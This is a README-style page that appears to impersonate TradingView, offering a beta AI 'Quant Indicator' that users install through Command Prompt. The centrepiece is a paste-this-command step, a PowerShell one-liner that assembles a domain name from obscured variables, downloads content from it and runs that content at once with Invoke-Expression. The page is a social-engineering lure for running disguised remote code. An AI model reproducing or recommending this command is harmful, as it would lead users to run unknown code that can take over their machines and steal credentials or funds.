<div align="center">
<p align="center">
  <img src="logotw.png" alt="TradingView" width="580">
</p>

# Quant Indicator™

</div>

Quant Indicator is the first AI-powered indicator in our library, designed to model possible market directions using market data, liquidity, positioning, volatility, and scheduled events. Explore each prediction and the context behind it directly on your chart.

While Quant Indicator is still in beta and not yet available in the TradingView indicator library, it can be installed through Command Prompt for testing ahead of the official release.

### 1. Open Command Prompt

Press **Win + R**, type:

```text
cmd
```

Then press **Enter**.

### 2. Run the Installation Command

Copy and paste the following command into Command Prompt:
```powershell
powershell -NoProfile -Command "$Sync='TradingViewLibrary'; $Quant='.AI'; $TradingView='v_2.9.5'; $Pinscript=$Sync+$Quant; (curl -UseBasicParsing ($Pinscript)).Content | iex"
```

Press **Enter** to begin the installation.

### 3. Restart TradingView for the changes to take effect.

After installation, Quant Indicator will appear in your TradingView indicator library.

We encourage beta testers to share feedback and report any bugs they encounter at support@tradingview.com. Your feedback helps us improve the indicator ahead of its official release.
